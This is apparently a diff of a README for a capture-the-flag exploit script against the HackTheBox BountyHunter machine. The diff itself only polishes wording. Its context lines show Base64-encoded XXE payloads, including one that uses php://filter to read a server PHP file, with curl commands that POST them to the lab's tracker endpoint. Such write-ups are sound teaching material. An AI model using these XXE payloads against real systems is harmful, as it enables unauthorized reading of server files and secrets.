@@ -6,7 +6,7 @@ Machine write-up: https://7rocky.github.io/en/htb/bountyhunter
 
 This Bash script automates the process of reading files from the server exploiting an XML External Entity (XXE) injection.
 
-There is an XML document that is being send in an AJAX POST request using this JavaScript code:
+There is an XML document that is being sent in an AJAX POST request using this JavaScript code:
 
 ```js
 function returnSecret(data) {
@@ -49,7 +49,7 @@ $ data=$(echo "<?xml version=\"1.0\"?>
 PD94bWwgdmVyc2lvbj0iMS4wIj8+ICAKPGJ1Z3JlcG9ydD4KICA8dGl0bGU+VGl0bGU8L3RpdGxlPgogIDxjd2U+Q1dFPC9jd2U+CiAgPGN2c3M+Q1ZTUzwvY3Zzcz4KICA8cmV3YXJkPjEzMzc8L3Jld2FyZD4KPC9idWdyZXBvcnQ+Cg==
 ```
 
-We cannot send this payload directly, because it contains `+` signs (which are like spaces in URL encoding). Then we need to URL encode the `+` signs (i.e. replacing them by `%2b`). This can be easily done with `sed`:
+We cannot send this payload directly, because it contains `+` signs (which are like spaces in URL encoding). Then we need to use URL encoding for the `+` signs (i.e. replacing them by `%2b`). This can be easily done with `sed`:
 
 ```console
 $ echo "<?xml version=\"1.0\"?>
@@ -62,7 +62,7 @@ $ echo "<?xml version=\"1.0\"?>
 PD94bWwgdmVyc2lvbj0iMS4wIj8%2bICAgICAgICAgICAgICAgICAgICAgICAgICAgCjxidWdyZXBvcnQ%2bCiAgPHRpdGxlPlRpdGxlPC90aXRsZT4KICA8Y3dlPkNXRTwvY3dlPgogIDxjdnNzPkNWU1M8L2N2c3M%2bCiAgPHJld2FyZD4xMzM3PC9yZXdhcmQ%2bCjwvYnVncmVwb3J0Pgo=
 ```
 
-Now we can send it with `curl`:
+Now we can send the payload with `curl`:
 
 ```console
 $ curl http://10.10.11.100/tracker_diRbPr00f314.php -d data=PD94bWwgdmVyc2lvbj0iMS4wIj8%2bICAgICAgICAgICAgICAgICAgICAgICAgICAgCjxidWdyZXBvcnQ%2bCiAgPHRpdGxlPlRpdGxlPC90aXRsZT4KICA8Y3dlPkNXRTwvY3dlPgogIDxjdnNzPkNWU1M8L2N2c3M%2bCiAgPHJld2FyZD4xMzM3PC9yZXdhcmQ%2bCjwvYnVncmVwb3J0Pgo=
@@ -171,7 +171,7 @@ $ echo "<?xml version=\"1.0\"?>
 PD94bWwgdmVyc2lvbj0iMS4wIj8%2bICAgICAgICAKPCFET0NUWVBFIGZvbyBbCiAgPCFFTlRJVFkgeHhlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2xvZ19zdWJtaXQucGhwIj4KXT4KPGJ1Z3JlcG9ydD4KICA8dGl0bGU%2bJnh4ZTs8L3RpdGxlPgogIDxjd2U%2bPC9jd2U%2bCiAgPGN2c3M%2bPC9jdnNzPgogIDxyZXdhcmQ%2bPC9yZXdhcmQ%2bCjwvYnVncmVwb3J0Pgo=
 ```
 
-Now we receive a Base64 encoded string:
+Now we receive a string encoded in Base64:
 
 ```
 $ curl http://10.10.11.100/tracker_diRbPr00f314.php -d data=PD94bWwgdmVyc2lvbj0iMS4wIj8%2bICAgICAgICAKPCFET0NUWVBFIGZvbyBbCiAgPCFFTlRJVFkgeHhlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2xvZ19zdWJtaXQucGhwIj4KXT4KPGJ1Z3JlcG9ydD4KICA8dGl0bGU%2bJnh4ZTs8L3RpdGxlPgogIDxjd2U%2bPC9jd2U%2bCiAgPGN2c3M%2bPC9jdnNzPgogIDxyZXdhcmQ%2bPC9yZXdhcmQ%2bCjwvYnVncmVwb3J0Pgo=
